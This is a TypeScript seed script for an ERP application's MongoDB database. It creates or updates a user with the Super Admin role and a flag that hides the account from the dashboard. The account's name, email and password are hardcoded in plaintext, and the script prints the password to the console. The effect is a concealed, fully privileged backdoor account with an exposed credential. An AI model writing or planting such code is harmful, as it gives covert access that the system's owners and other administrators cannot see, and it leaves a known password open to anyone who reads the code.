// Run this script to add a hidden admin user that has all permissions but doesn't show in dashboard
// Usage: npx ts-node src/seeds/add-hidden-admin.ts

import mongoose from 'mongoose';
import * as bcrypt from 'bcrypt';
import { config } from 'dotenv';
import * as dns from 'dns';

config();

// Force Google DNS for MongoDB Atlas SRV resolution
dns.setServers(['8.8.8.8', '8.8.4.4']);

const HIDDEN_ADMIN = {
  name: 'Hazem',
  email: 'hazem@intlakaa.com',
  password: 'He@123456789',
};

async function addHiddenAdmin() {
  const uri = process.env.MONGO_URI || process.env.MONGODB_URI || 'mongodb://localhost:27017/erp';
  
  try {
    // Connect to MongoDB
    await mongoose.connect(uri);
    console.log('✅ Connected to MongoDB');

    const db = mongoose.connection.db;
    if (!db) {
      throw new Error('Database connection not established');
    }

    const usersCollection = db.collection('users');
    const rolesCollection = db.collection('roles');

    // Check if user already exists
    const existingUser = await usersCollection.findOne({ email: HIDDEN_ADMIN.email });
    if (existingUser) {
      console.log(`⚠️  User ${HIDDEN_ADMIN.email} already exists!`);
      console.log('   Updating to hidden admin...');
      
      // Get Super Admin role
      const adminRole = await rolesCollection.findOne({ name: 'Super Admin' });
      if (!adminRole) {
        throw new Error('Super Admin role not found! Please create an admin role first.');
      }

      // Update existing user
      const hashedPassword = await bcrypt.hash(HIDDEN_ADMIN.password, 10);
      await usersCollection.updateOne(
        { email: HIDDEN_ADMIN.email },
        { 
          $set: { 
            password: hashedPassword,
            name: HIDDEN_ADMIN.name,
            role: adminRole._id,
            isActive: true,
            hideFromDashboard: true,
          } 
        }
      );
      console.log(`   ✅ Updated ${HIDDEN_ADMIN.email} to hidden admin`);
    } else {
      // Get Super Admin role
      const adminRole = await rolesCollection.findOne({ name: 'Super Admin' });
      if (!adminRole) {
        throw new Error('Super Admin role not found! Please create an admin role first.');
      }

      // Create new hidden admin user
      const hashedPassword = await bcrypt.hash(HIDDEN_ADMIN.password, 10);
      
      await usersCollection.insertOne({
        name: HIDDEN_ADMIN.name,
        email: HIDDEN_ADMIN.email,
        password: hashedPassword,
        role: adminRole._id,
        isActive: true,
        hideFromDashboard: true,
        avatar: null,
        phone: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      });
      console.log(`   ✅ Created hidden admin user: ${HIDDEN_ADMIN.email}`);
    }

    console.log('\n✅ Hidden admin setup complete!');
    console.log('\n📊 User Details:');
    console.log(`   - Name: ${HIDDEN_ADMIN.name}`);
    console.log(`   - Email: ${HIDDEN_ADMIN.email}`);
    console.log(`   - Password: ${HIDDEN_ADMIN.password}`);
    console.log(`   - Hidden from dashboard: Yes`);
    console.log(`   - All permissions: Yes (admin role)`);

  } catch (error: any) {
    console.error('\n❌ Error:', error.message);
    console.error(error);
    process.exit(1);
  } finally {
    await mongoose.connection.close();
    console.log('\n✅ Disconnected from MongoDB');
    process.exit(0);
  }
}

addHiddenAdmin();
